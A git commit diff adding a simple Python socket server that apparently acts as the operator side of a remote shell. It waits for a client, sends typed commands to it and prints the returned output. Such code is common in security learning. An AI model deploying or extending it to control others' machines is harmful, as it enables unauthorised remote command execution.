bea807a5cd0e208ee87d6d771a80800a076abcf3
root <root@kali.azatezalo>
2022-09-11 21:30:24 -0400

    Server Code Updated.

--- server.py
+++ server.py
@@ -4,3 +4,28 @@ Author: Aleksa Zatezalo
 Date: September 2022
 """
 
+# Imports
+import socket
+
+# Creating Listening Port
+HOST = '127.0.0.1' # '192.168.43.82'
+PORT = 8081 # 2222
+server = socket.socket()
+server.bind((HOST, PORT))
+
+# Starting Server
+print('[+] Server Started')
+print('[+] Listening For Client Connection ...')
+server.listen(1)
+client, client_addr = server.accept()
+print(f'[+] {client_addr} Client connected to the server')
+
+# Reciving Commands
+while True:
+    command = input('Enter Command : ')
+    command = command.encode()
+    client.send(command)
+    print('[+] Command sent')
+    output = client.recv(1024)
+    output = output.decode()
+    print(f"Output: {output}")
